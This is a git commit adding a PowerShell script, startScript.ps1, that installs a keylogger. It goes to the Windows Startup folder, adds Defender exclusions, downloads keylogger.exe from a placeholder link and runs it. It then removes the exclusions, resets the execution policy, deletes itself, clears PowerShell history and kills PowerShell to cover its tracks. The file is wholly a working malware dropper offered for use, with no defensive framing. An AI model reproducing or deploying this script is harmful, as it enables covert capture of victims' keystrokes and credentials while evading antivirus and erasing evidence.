f01fa3263b1e0d92b7175bc373b12009b39732b4
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-16 19:37:05 +0100

    Add files via upload

---
+++ startScript.ps1
@@ -0,0 +1,11 @@
+cd $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
+Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
+wget LINK -O keylogger.exe #Download keylogger script
+Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
+start keylogger.exe #Start keylogger script
+Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
+Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
+Set-ExecutionPolicy restricted -Force #Reset script execution policy
+del C:\Users\Public\Documents\startScript.ps1
+Clear-Content (Get-PSReadlineOption).HistorySavePath
+taskkill -F /IM powershell.exe
